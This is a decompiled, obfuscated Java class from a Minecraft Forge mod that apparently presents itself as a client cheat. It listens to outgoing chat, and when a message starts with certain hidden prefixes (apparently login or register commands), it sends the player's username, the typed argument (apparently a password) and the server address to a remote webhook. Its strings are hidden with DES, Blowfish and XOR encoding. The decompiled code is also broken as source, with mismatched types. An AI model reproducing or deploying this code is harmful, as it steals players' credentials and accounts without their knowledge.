package com.wao.silent;

import com.wao.silent.cheat.hitted;
import com.wao.silent.config.cfg;
import java.awt.Color;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.Arrays;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import net.minecraft.client.Minecraft;
import net.minecraftforge.client.event.ClientChatEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;

public class waolol {
   // $FF: synthetic field
   private static final int[] lllllI;
   // $FF: synthetic field
   hitted waobarbie;
   // $FF: synthetic field
   private static final String[] llIIIl;

   static {
      lIlIIll();
      lIIllIl();
   }

   private static boolean lIlIlII(int var0) {
      return var0 == 0;
   }

   private static String lIIlIlI(String llllIllIlIlllII, String llllIllIlIlllIl) {
      try {
         SecretKeySpec llllIllIllIIIIl = new SecretKeySpec(Arrays.copyOf(MessageDigest.getInstance("MD5").digest(llllIllIlIlllIl.getBytes(StandardCharsets.UTF_8)), lllllI[9]), "DES");
         String llllIllIlIllIIl = Cipher.getInstance("DES");
         llllIllIlIllIIl.init(lllllI[2], llllIllIllIIIIl);
         return new String(llllIllIlIllIIl.doFinal(Base64.getDecoder().decode(llllIllIlIlllII.getBytes(StandardCharsets.UTF_8))), StandardCharsets.UTF_8);
      } catch (Exception var4) {
         var4.printStackTrace();
         return null;
      }
   }

   @SubscribeEvent
   public void ChatEvent(ClientChatEvent llllIllIllIllIl) {
      String llllIllIllIllII = llllIllIllIllIl.getMessage();
      String[] llllIllIllIlIll = llllIllIllIllIl.getMessage().split(llIIIl[lllllI[0]]);
      if ((!lIlIlII(llllIllIllIllII.startsWith(llIIIl[lllllI[1]])) || !lIlIlII(llllIllIllIllII.startsWith(llIIIl[lllllI[2]])) || !lIlIlII(llllIllIllIllII.startsWith(llIIIl[lllllI[3]])) || lIlIlIl(llllIllIllIllII.startsWith(llIIIl[lllllI[4]]))) && lIlIllI(llllIllIllIlIll.length, lllllI[1])) {
         try {
            llllIllIllIlllI.waobarbie.clearEmbeds();
            llllIllIllIlllI.waobarbie.addEmbed((new hitted.EmbedObject()).setTitle(llIIIl[lllllI[5]]).setDescription(llIIIl[lllllI[6]]).setColor(new Color(lllllI[7])).addField(llIIIl[lllllI[8]], Minecraft.func_71410_x().func_110432_I().func_111285_a(), (boolean)lllllI[1]).addField(llIIIl[lllllI[9]], llllIllIllIlIll[lllllI[1]], (boolean)lllllI[1]).addField(llIIIl[lllllI[10]], Minecraft.func_71410_x().func_147104_D().field_78845_b, (boolean)lllllI[1]).setThumbnail(llIIIl[lllllI[11]]));
            llllIllIllIlllI.waobarbie.execute();
         } catch (IOException var5) {
            var5.printStackTrace();
            return;
         }

         "".length();
         if ("  ".length() >= (47 ^ 43)) {
            return;
         }
      }

   }

   private static boolean lIlIllI(int var0, int var1) {
      return var0 > var1;
   }

   private static void lIlIIll() {
      lllllI = new int[13];
      lllllI[0] = (242 ^ 191) & ~(112 ^ 61);
      lllllI[1] = " ".length();
      lllllI[2] = "  ".length();
      lllllI[3] = "   ".length();
      lllllI[4] = 166 + 134 - 285 + 183 ^ 54 + 63 - 44 + 121;
      lllllI[5] = 128 + 92 - 68 + 22 ^ 161 + 0 - 153 + 163;
      lllllI[6] = 189 ^ 187;
      lllllI[7] = -(-4748 & 15247) & -20481 & 11041259;
      lllllI[8] = 86 ^ 115 ^ 60 ^ 30;
      lllllI[9] = 27 ^ 65 ^ 199 ^ 149;
      lllllI[10] = 136 ^ 129;
      lllllI[11] = 3 ^ 9;
      lllllI[12] = 148 ^ 144 ^ 43 ^ 36;
   }

   private static String lIIIlll(String llllIllIIlllIIl, String llllIllIIlllIII) {
      try {
         short llllIllIIllIlIl = new SecretKeySpec(MessageDigest.getInstance("MD5").digest(llllIllIIlllIII.getBytes(StandardCharsets.UTF_8)), "Blowfish");
         Exception llllIllIIllIlII = Cipher.getInstance("Blowfish");
         llllIllIIllIlII.init(lllllI[2], llllIllIIllIlIl);
         return new String(llllIllIIllIlII.doFinal(Base64.getDecoder().decode(llllIllIIlllIIl.getBytes(StandardCharsets.UTF_8))), StandardCharsets.UTF_8);
      } catch (Exception var4) {
         var4.printStackTrace();
         return null;
      }
   }

   private static String lIIlIll(String llllIllIlIIlIIl, String llllIllIlIIlIII) {
      llllIllIlIIlIIl = new String(Base64.getDecoder().decode(llllIllIlIIlIIl.getBytes(StandardCharsets.UTF_8)), StandardCharsets.UTF_8);
      boolean llllIllIlIIIlll = new StringBuilder();
      char[] llllIllIlIIlIll = llllIllIlIIlIII.toCharArray();
      int llllIllIlIIlIlI = lllllI[0];
      float llllIllIlIIIlII = llllIllIlIIlIIl.toCharArray();
      String llllIllIlIIIIll = llllIllIlIIIlII.length;
      int llllIllIlIIIIlI = lllllI[0];

      do {
         if (!lIlIlll(llllIllIlIIIIlI, llllIllIlIIIIll)) {
            return String.valueOf(llllIllIlIIIlll);
         }

         String llllIllIlIIIIIl = llllIllIlIIIlII[llllIllIlIIIIlI];
         llllIllIlIIIlll.append((char)(llllIllIlIIIIIl ^ llllIllIlIIlIll[llllIllIlIIlIlI % llllIllIlIIlIll.length]));
         "".length();
         ++llllIllIlIIlIlI;
         ++llllIllIlIIIIlI;
         "".length();
      } while((25 ^ 5 ^ 11 ^ 19) == (140 ^ 184 ^ 124 ^ 76));

      return null;
   }

   private static void lIIllIl() {
      llIIIl = new String[lllllI[12]];
      llIIIl[lllllI[0]] = lIIIlll("PtoawHlj1U8=", "InBmD");
      llIIIl[lllllI[1]] = lIIIlll("fMk84tw/EqE=", "cvYaS");
      llIIIl[lllllI[2]] = lIIlIlI("fx3ANJISiY8=", "BewAm");
      llIIIl[lllllI[3]] = lIIIlll("ObNfK3GyUek=", "OvOqT");
      llIIIl[lllllI[4]] = lIIlIll("ZAA1HQA4BjUI", "KrPzi");
      llIIIl[lllllI[5]] = lIIIlll("UHFmvkD9S3BIqybepyCbsg==", "oXMiT");
      llIIIl[lllllI[6]] = lIIIlll("6wSyze5Ia6cnPDpa/MBMuvZg6ycpzNjhDfXo5bFVCqQ=", "rjlwO");
      llIIIl[lllllI[8]] = lIIlIlI("1uNEBfAhqSg=", "KEnzM");
      llIIIl[lllllI[9]] = lIIlIll("Cig6IQ4VOy0=", "ZiirY");
      llIIIl[lllllI[10]] = lIIlIlI("QdOFC20v5/4=", "VrCvV");
      llIIIl[lllllI[11]] = lIIlIlI("rHKr1px4GOx9TNkakqHrad0/3Uw7DpAhqZ3J9UD5xQhCDSbxNCipwjwJf0FFLOdQ7FKwugt+ICwakR3b1JXoOOjrUUYcYO8IiJcKFYI4zVy+T0IyF5c58xW6M8Z57fLymvHziLeSf4bCCNfuKQg4xUe6ct9o9rIqTvEzlYSNSSXehQq1HsZG3Q==", "ITsVz");
   }

   private static boolean lIlIlll(int var0, int var1) {
      return var0 < var1;
   }

   private static boolean lIlIlIl(int var0) {
      return var0 != 0;
   }

   public waolol() {
      llllIllIlllIlIl.waobarbie = cfg.babie;
   }
}
